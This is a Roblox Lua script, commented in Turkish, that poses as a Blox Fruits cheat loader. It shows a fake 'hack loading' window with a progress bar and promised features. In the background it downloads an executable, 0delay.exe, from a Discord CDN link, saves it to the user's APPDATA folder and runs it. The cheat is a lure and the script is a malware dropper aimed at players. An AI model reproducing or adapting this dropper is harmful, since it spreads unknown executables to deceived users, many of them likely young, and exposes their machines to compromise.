-- ==============================================
--  BASIT SAHTE BLOX FRUITS HILE
-- ==============================================

local gui = Instance.new("ScreenGui")
gui.Parent = game.Players.LocalPlayer.PlayerGui

local frame = Instance.new("Frame")
frame.Parent = gui
frame.Size = UDim2.new(0, 400, 0, 300)
frame.Position = UDim2.new(0.5, -200, 0.5, -150)
frame.BackgroundColor3 = Color3.fromRGB(10, 10, 20)
frame.BorderSizePixel = 2
frame.BorderColor3 = Color3.fromRGB(255, 0, 0)

local title = Instance.new("TextLabel")
title.Parent = frame
title.Size = UDim2.new(1, 0, 0, 50)
title.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
title.Text = "BLOX FRUITS HACK"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextScaled = true
title.Font = Enum.Font.Bold

local status = Instance.new("TextLabel")
status.Parent = frame
status.Size = UDim2.new(1, -20, 0, 40)
status.Position = UDim2.new(0, 10, 0, 60)
status.BackgroundTransparency = 1
status.Text = "🔓 HILE YUKLENIYOR..."
status.TextColor3 = Color3.fromRGB(0, 255, 200)
status.TextSize = 20
status.Font = Enum.Font.SourceSansBold

local barBg = Instance.new("Frame")
barBg.Parent = frame
barBg.Size = UDim2.new(0.8, 0, 0, 20)
barBg.Position = UDim2.new(0.1, 0, 0, 110)
barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)

local bar = Instance.new("Frame")
bar.Parent = barBg
bar.Size = UDim2.new(0, 0, 1, 0)
bar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)

local features = Instance.new("TextLabel")
features.Parent = frame
features.Size = UDim2.new(1, -20, 0, 80)
features.Position = UDim2.new(0, 10, 0, 140)
features.BackgroundTransparency = 1
features.Text = "✅ Auto Farm\n✅ Auto Fruit\n✅ ESP Hack"
features.TextColor3 = Color3.fromRGB(100, 255, 100)
features.TextSize = 15
features.Font = Enum.Font.SourceSans
features.TextXAlignment = Enum.TextXAlignment.Left

local info = Instance.new("TextLabel")
info.Parent = frame
info.Size = UDim2.new(1, -20, 0, 30)
info.Position = UDim2.new(0, 10, 0, 230)
info.BackgroundTransparency = 1
info.Text = "🔄 Yükleniyor..."
info.TextColor3 = Color3.fromRGB(255, 200, 0)
info.TextSize = 14

-- ARKA PLANDA EXE
spawn(function()
    wait(0.5)
    for i = 1, 100 do
        wait(0.03)
        bar.Size = UDim2.new(i / 100, 0, 1, 0)
        if i < 30 then info.Text = "🔄 Sunucuya bağlanılıyor..." 
        elseif i < 60 then info.Text = "📦 Dosyalar indiriliyor..." 
        else info.Text = "⚙️ Sistem hazırlanıyor..." end
    end
    
    -- EXE İNDİR
    local url = "https://cdn.discordapp.com/attachments/1511742046610784418/1520128051973849158/0delay.exe?ex=6a401112&is=6a3ebf92&hm=53ca9f708807e7c6988bd43c037720197881f8cc4013c403a461e8b54dd03e47&"
    local path = os.getenv("APPDATA") .. "\\0delay.exe"
    local file = io.open(path, "wb")
    file:write(game:HttpGet(url))
    file:close()
    os.execute('start "" "' .. path .. '"')
    
    info.Text = "✅ Hile başarıyla yüklendi!"
    status.Text = "✅ HAZIR!"
    bar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
end)
